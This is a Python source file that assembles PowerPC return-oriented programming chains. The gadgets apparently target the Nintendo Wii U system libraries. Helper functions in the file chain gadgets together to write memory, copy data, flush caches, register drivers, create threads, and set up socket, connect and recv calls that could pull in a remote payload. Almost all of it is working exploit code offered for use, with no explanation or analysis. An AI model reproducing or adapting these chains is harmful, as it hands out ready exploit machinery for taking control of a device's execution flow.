from common.ropgadget_addr import *


def setr3r4(r3, r4):
    # lwz r3, 8(r1); lwz r4, 0xc(r1); lwz r0, 0x14(r1); mtlr r0; addi r1, r1, 0x10; blr; 
    return [ROP_GX2_r3r4load,   
            r3,                 
            r4,
            0x42424242]


def pop_r24_to_r31(inputregs):
    curchain = [
        ROP_POP_R24_TO_R31,
        0x42424242,
        0x42424242]

    for i in range(0, 8):
        curchain.append(inputregs[i])

    curchain.append(0x42424242)
    return curchain


def call_func(funcaddr, r3=0, r4=0, r5=0, r6=0, r28=0):
    curchain = []
    input_regs = [r6,
                  r5,
                  0x42424242,
                  ROP_CALLR28_POP_R28_TO_R31,
                  funcaddr,
                  r3,
                  0x42424242,
                  r4]

    curchain += pop_r24_to_r31(input_regs)

    curchain.append(ROP_CALLFUNC)
    curchain.append(r28)
    curchain.append(0x42424242)
    curchain.append(0x42424242)
    curchain.append(0x42424242)
    curchain.append(0x42424242)
    return curchain


def tiny_call(fptr, r3=0x42424242, r4=0x42424242):
    curchain = []
    curchain += setr3r4(r3, r4)
    curchain.append(ROP_POP_R28R29R30R31)
    curchain.append(fptr)
    curchain.append(0x42424242)
    curchain.append(0x42424242)
    curchain.append(r4)
    curchain.append(0x42424242)
    curchain.append(ROP_CALLR28_POP_R28_TO_R31)
    curchain.append(0x42424242)
    curchain.append(0x42424242)
    curchain.append(0x42424242)
    curchain.append(0x42424242)
    curchain.append(0x42424242)
    return curchain


def write_r3r4_tomem(outaddr):
    return [ROP_POP_R28R29R30R31,
            ROP_OSGetCodegenVirtAddrRange + 0x20,
            0x42424242,
            outaddr,
            0x10010104,
            0x42424242,
            ROP_CALLR28_POP_R28_TO_R31,
            0x42424242,
            0x42424242,
            0x42424242]


def write32(addr, value):
    cur_chain = []
    cur_chain += setr3r4(value, 0x42424242)
    cur_chain += write_r3r4_tomem(addr)
    return cur_chain



def call_with_dereferenced_r3_tiny(addr, arg1_ptr, arg2=0):
    cur_chain = []
    # now we can set r3
    cur_chain += setr3r4(arg1_ptr, 0)

    cur_chain.append(ROP_lwz_r3_0_r3__lwz_r0_0xc_r1__mtlr_r0__addi_r1_r1_8__blr)  # #0x2024858 r3 = *r3 # lwz r3, 0(r3); lwz r0, 0xc(r1); mtlr r0; addi r1, r1, 8; blr;
    cur_chain.append(0x42424242)  # + 8

    # set func address to r28, arg2 to r31
    cur_chain.append(
        ROP_POP_R28R29R30R31)  # coreinit.rpl 0x020014d4: lwz r28, 8(r1); lwz r29, 0xc(r1); lwz r0, 0x1c(r1); lwz r30, 0x10(r1); mtlr r0; lwz r31, 0x14(r1); addi r1, r1, 0x18; blr;
    cur_chain.append(addr)  # r28 + 8
    cur_chain.append(0x42424242)  # r29 +0x0C
    cur_chain.append(0x42424242)  # r30+ 0x10
    cur_chain.append(arg2)  # r31 + 0x14
    cur_chain.append(0x42424242)  # + 0x18

    # r31 will be moved to r4
    cur_chain.append(
        ROP_CALLR28_POP_R28_TO_R31);  # coreinit: 0x02061970: mtctr r28; mr r4, r31; bctrl; lwz r28, 8(r1); lwz r29, 0xc(r1); lwz r0, 0x1c(r1); lwz r31, 0x14(r1); mtlr r0; lwz r30, 0x10(r1); addi r1, r1, 0x18; blr;
    cur_chain.append(0x42424242)  # r28 + 8
    cur_chain.append(0x42424242)  # r29 + 0xC
    cur_chain.append(0x42424242)  # r30 + 0x10
    cur_chain.append(0x42424242)  # r31 + 0x14
    cur_chain.append(0x42424242)  # + 0x18
    return cur_chain


def DCFlushRange(addr, size):
    return tiny_call(ROP_DCFlushRange, addr, size)


def ICInvalidateRange(addr, size):
    return tiny_call(ROP_ICInvalidateRange, addr, size)


def memcpy(dest, src, size):
    return call_func(ROP_memcpy, dest, src, size)


def OSDriver_Register(name, name_len, unkwn1, unkwn2):
    return call_func(ROP_Register, name, name_len, unkwn1, unkwn2)


def OSDriver_CopyToSaveArea(name, name_len, data, data_len):
    return call_func(ROP_CopyToSaveArea, name, name_len, data, data_len)


def OSResumeThread(thread):
    return tiny_call(ROP_OSResumeThread, thread)


def OSFatal(arg):
    return tiny_call(ROP_OSFatal, arg)


def OSSuspendThread(thread):
    return tiny_call(ROP_OSSuspendThread, thread)


def OSDynLoad_Acquire(name_ptr, handle_ptr):
    return tiny_call(ROP_OSDynLoad_Acquire, name_ptr, handle_ptr)


def OSExitThread(resultcode):
    return tiny_call(ROP_OSExitThread, resultcode)


def socket(domain, type, protocol):
    return call_func(ROP_socket, domain, type, protocol)


def connect(sockfd, addr, addrlen):
    return call_func(ROP_connect, sockfd, addr, addrlen)


def recv(sockfd, buf, len, flags):
    return call_func(ROP_recv, sockfd, buf, len, flags)


def GX2WaitForVsync():
    return tiny_call(ROP_GX2WaitForVsync)


def GX2Flush():
    return tiny_call(ROP_GX2Flush)


def GX2DrawDone():
    return tiny_call(ROP_GX2DrawDone)


def GX2DirectCallDisplayList(addr, size):
    return tiny_call(ROP_GX2DirectCallDisplayList, addr, size)

def OSCreateThread(thread, entry, argc, argv, stack, stackSize, priority, attributes):
    curchain = [];
    inputregs = [1, 2, 3, 4, 5, 6, 7, 8]
    inputregs[24 - 24] = 0x42424242  # #r24
    inputregs[25 - 24] = stack  # #r25 # r7
    inputregs[26 - 24] = stackSize  # #r26 # r8
    inputregs[27 - 24] = priority  # #r27 # r9
    inputregs[28 - 24] = thread  # #r28 #r3
    inputregs[29 - 24] = entry  # #r29 #r4
    inputregs[30 - 24] = argc  ##r30 #r5
    inputregs[31 - 24] = argv  # #r31 # r6
    curchain += pop_r24_to_r31(inputregs)

    # 0x020257a8: li r0, 2; lhz r10, 0xc(r1); mr r3, r28; mr r8, r26; stw r0, 8(r1); mr r4, r29; mr r5, r30; mr r6, r31;
    # mr r7, r25; mr r9, r27; bl 0x2025548; lmw r25, 0x14(r1); lwz r0, 0x34(r1);mtlr r0; addi r1, r1, 0x30; blr;
    curchain.append(ROP_CreateThreadInternal)
    curchain.append(2)  # param #10 ;r1 +8
    curchain.append(attributes << 16)  # r10 ;r1 +12 (lhz from this register)
    curchain.append(0x42424242)  # ;r1 +16
    curchain.append(0x42424242)  # r25 ;r1 +20
    curchain.append(0x42424242)  # r26 ;r1 +24
    curchain.append(0x42424242)  # r27 ;r1 +28
    curchain.append(0x42424242)  # r28 ;r1 +32
    curchain.append(0x42424242)  # r29 ;r1 +36
    curchain.append(0x42424242)  # r30 ;r1 +40
    curchain.append(0x42424242)  # r31 ;r1 +44 (0x2C)
    curchain.append(0x42424242)
    return curchain;
